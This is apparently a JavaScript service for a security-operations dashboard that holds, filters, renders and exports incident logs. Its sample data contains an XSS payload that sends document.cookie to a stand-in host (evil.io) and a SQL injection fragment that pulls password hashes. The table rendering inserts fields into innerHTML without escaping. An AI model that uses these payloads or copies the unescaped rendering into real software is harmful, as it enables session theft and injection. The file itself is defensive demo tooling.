/**
 * Threat History & SOC Incident Log Service
 * Manages incident records, multi-criteria filtering, search, pagination, status transitions, and CSV/JSON export.
 */

class ThreatLogsService {
  constructor() {
    this.logs = [];
    this.currentPage = 1;
    this.pageSize = 10;
    this.searchQuery = '';
    this.filterSeverity = 'ALL';
    this.filterStatus = 'ALL';
    this.filterCategory = 'ALL';
    this.sortColumn = 'timestamp';
    this.sortOrder = 'desc';

    this.initDefaultLogs();
  }

  initDefaultLogs() {
    const initialLogs = [
      {
        id: 'INC-90141',
        timestamp: new Date(Date.now() - 120000).toLocaleTimeString(),
        sourceIp: '192.168.10.50',
        destIp: '172.16.0.1',
        destPort: 80,
        protocol: 'TCP',
        category: 'DDoS Attack',
        riskLevel: 'CRITICAL',
        confidence: 99.4,
        status: 'New',
        payloadSnippet: 'SYN_FLOOD_ANOMALY_SEQ_0x89FA',
        model: 'Deep Neural Network (4-Layer)',
        rawPacket: {
          flowDuration: 1420,
          fwdPackets: 1250,
          entropy: 2.15,
          synCount: 1248
        }
      },
      {
        id: 'INC-90142',
        timestamp: new Date(Date.now() - 360000).toLocaleTimeString(),
        sourceIp: '203.0.113.88',
        destIp: '10.0.0.2',
        destPort: 3306,
        protocol: 'TCP',
        category: 'SQL Injection',
        riskLevel: 'CRITICAL',
        confidence: 98.7,
        status: 'Investigating',
        payloadSnippet: 'UNION SELECT username, password_hash FROM admin--',
        model: 'XGBoost Gradient Booster',
        rawPacket: {
          flowDuration: 230,
          fwdPackets: 12,
          entropy: 5.62,
          synCount: 1
        }
      },
      {
        id: 'INC-90143',
        timestamp: new Date(Date.now() - 600000).toLocaleTimeString(),
        sourceIp: '198.51.100.44',
        destIp: '10.0.2.14',
        destPort: 445,
        protocol: 'SMB',
        category: 'Ransomware / C2',
        riskLevel: 'CRITICAL',
        confidence: 97.9,
        status: 'Contained',
        payloadSnippet: 'COBALT_STRIKE_PIPE_STATUS_STAGE2_BEACON',
        model: 'Deep Neural Network (4-Layer)',
        rawPacket: {
          flowDuration: 120000,
          fwdPackets: 120,
          entropy: 7.99,
          synCount: 1
        }
      },
      {
        id: 'INC-90144',
        timestamp: new Date(Date.now() - 920000).toLocaleTimeString(),
        sourceIp: '185.220.101.5',
        destIp: '10.0.0.1',
        destPort: 22,
        protocol: 'TCP',
        category: 'Brute Force',
        riskLevel: 'HIGH',
        confidence: 95.1,
        status: 'Contained',
        payloadSnippet: 'SSH_AUTH_FAIL_CYCLIC_WORDLIST_ROOT',
        model: 'Random Forest Ensemble (150 Trees)',
        rawPacket: {
          flowDuration: 15200,
          fwdPackets: 420,
          entropy: 4.12,
          synCount: 15
        }
      },
      {
        id: 'INC-90145',
        timestamp: new Date(Date.now() - 1400000).toLocaleTimeString(),
        sourceIp: '194.26.29.112',
        destIp: '10.0.0.80',
        destPort: 80,
        protocol: 'HTTP',
        category: 'Cross-Site Scripting (XSS)',
        riskLevel: 'HIGH',
        confidence: 94.2,
        status: 'New',
        payloadSnippet: "<script>fetch('https://evil.io/steal?c='+document.cookie)</script>",
        model: 'Deep Neural Network (4-Layer)',
        rawPacket: {
          flowDuration: 110,
          fwdPackets: 6,
          entropy: 6.10,
          synCount: 1
        }
      },
      {
        id: 'INC-90146',
        timestamp: new Date(Date.now() - 1800000).toLocaleTimeString(),
        sourceIp: '45.33.32.156',
        destIp: '10.0.0.1',
        destPort: 8080,
        protocol: 'TCP',
        category: 'Port Scanning',
        riskLevel: 'MEDIUM',
        confidence: 91.5,
        status: 'False Positive',
        payloadSnippet: 'NMAP_SYN_STEALTH_PROBE_T4',
        model: 'Random Forest Ensemble (150 Trees)',
        rawPacket: {
          flowDuration: 45,
          fwdPackets: 2,
          entropy: 1.90,
          synCount: 2
        }
      }
    ];

    this.logs = initialLogs;
  }

  addIncident(incident) {
    const newInc = {
      id: `INC-${Math.floor(90000 + Math.random() * 9999)}`,
      timestamp: new Date().toLocaleTimeString(),
      status: 'New',
      ...incident
    };
    this.logs.unshift(newInc);
    return newInc;
  }

  updateIncidentStatus(incidentId, newStatus) {
    const item = this.logs.find(l => l.id === incidentId);
    if (item) {
      item.status = newStatus;
      this.renderTable();
    }
  }

  getFilteredLogs() {
    return this.logs.filter(log => {
      // Search query across ID, Source IP, Dest IP, Category, Payload
      if (this.searchQuery) {
        const q = this.searchQuery.toLowerCase();
        const matches = 
          log.id.toLowerCase().includes(q) ||
          log.sourceIp.toLowerCase().includes(q) ||
          log.destIp.toLowerCase().includes(q) ||
          log.category.toLowerCase().includes(q) ||
          (log.payloadSnippet && log.payloadSnippet.toLowerCase().includes(q));
        if (!matches) return false;
      }

      // Severity filter
      if (this.filterSeverity !== 'ALL' && log.riskLevel !== this.filterSeverity) {
        return false;
      }

      // Status filter
      if (this.filterStatus !== 'ALL' && log.status !== this.filterStatus) {
        return false;
      }

      // Category filter
      if (this.filterCategory !== 'ALL' && log.category !== this.filterCategory) {
        return false;
      }

      return true;
    });
  }

  getPaginatedLogs() {
    const filtered = this.getFilteredLogs();
    const start = (this.currentPage - 1) * this.pageSize;
    return {
      total: filtered.length,
      totalPages: Math.ceil(filtered.length / this.pageSize) || 1,
      rows: filtered.slice(start, start + this.pageSize)
    };
  }

  renderTable() {
    const tableBody = document.getElementById('threat-logs-tbody');
    if (!tableBody) return;

    const data = this.getPaginatedLogs();
    tableBody.innerHTML = '';

    if (data.rows.length === 0) {
      tableBody.innerHTML = `
        <tr>
          <td colspan="9" style="text-align: center; padding: 30px; color: var(--text-muted);">
            <i class="fas fa-shield-slash" style="font-size: 1.5rem; margin-bottom: 8px; display: block;"></i>
            No threat logs match the active filter criteria.
          </td>
        </tr>
      `;
      return;
    }

    data.rows.forEach(log => {
      const tr = document.createElement('tr');
      
      const sevClass = log.riskLevel === 'CRITICAL' ? 'severity-critical' :
                       log.riskLevel === 'HIGH' ? 'severity-high' :
                       log.riskLevel === 'MEDIUM' ? 'severity-medium' :
                       log.riskLevel === 'LOW' ? 'severity-low' : 'severity-info';

      const statClass = log.status === 'New' ? 'status-new' :
                        log.status === 'Investigating' ? 'status-investigating' :
                        log.status === 'Contained' ? 'status-contained' : 'status-fp';

      tr.innerHTML = `
        <td style="color: var(--neon-cyan); font-weight: 600;">${log.id}</td>
        <td style="color: var(--text-secondary);">${log.timestamp}</td>
        <td><span class="severity-badge ${sevClass}">${log.riskLevel}</span></td>
        <td style="font-weight: 600; color: #fff;">${log.category}</td>
        <td style="color: #00ffcc;">${log.sourceIp}</td>
        <td style="color: var(--text-secondary);">${log.destIp}:${log.destPort}</td>
        <td>
          <div style="display: flex; align-items: center; gap: 6px;">
            <div style="flex: 1; height: 6px; background: rgba(255,255,255,0.08); border-radius: 3px; width: 50px;">
              <div style="width: ${log.confidence}%; height: 100%; background: var(--neon-cyan); border-radius: 3px;"></div>
            </div>
            <span style="font-weight: 600;">${log.confidence}%</span>
          </div>
        </td>
        <td><span class="status-badge ${statClass}">${log.status}</span></td>
        <td>
          <button class="cyber-btn cyber-btn-sm" onclick="window.forensicInvestigator.openInvestigation('${log.id}')" title="Deep Forensic Investigation">
            <i class="fas fa-microscope"></i> Investigate
          </button>
        </td>
      `;
      tableBody.appendChild(tr);
    });

    // Update Pagination UI
    const pageInfo = document.getElementById('log-page-info');
    if (pageInfo) {
      pageInfo.textContent = `Page ${this.currentPage} of ${data.totalPages} (${data.total} total incidents)`;
    }
  }

  exportCSV() {
    const filtered = this.getFilteredLogs();
    const headers = ['ID', 'Timestamp', 'Severity', 'Category', 'Source_IP', 'Dest_IP', 'Port', 'Protocol', 'Confidence', 'Status', 'Payload'];
    const csvRows = [headers.join(',')];

    filtered.forEach(l => {
      const row = [
        l.id,
        `"${l.timestamp}"`,
        l.riskLevel,
        `"${l.category}"`,
        l.sourceIp,
        l.destIp,
        l.destPort,
        l.protocol,
        l.confidence,
        l.status,
        `"${(l.payloadSnippet || '').replace(/"/g, '""')}"`
      ];
      csvRows.push(row.join(','));
    });

    const blob = new Blob([csvRows.join('\n')], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `Cyber_Threat_Audit_Log_${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  }

  exportJSON() {
    const filtered = this.getFilteredLogs();
    const blob = new Blob([JSON.stringify(filtered, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `Cyber_Threat_Audit_Log_${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  }
}

window.threatLogsService = new ThreatLogsService();
